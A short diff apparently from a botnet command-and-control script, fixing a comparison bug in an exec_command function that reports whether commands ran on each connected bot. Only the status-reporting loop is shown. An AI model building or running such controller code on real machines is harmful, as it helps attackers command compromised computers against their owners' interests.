@@ -92,7 +92,7 @@ def exec_command(cmd):
         resp = botnet[bot].recv(1024).decode()
         if(resp == "SUCCESS"):
             print("[*] Command executed on %s"%(bot))
-        elif(resp = "FAILED"):
+        elif(resp == "FAILED"):
             print("[*] Command execution failed on %s"%(bot))
         #cmd_size = len(cmd)
         #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
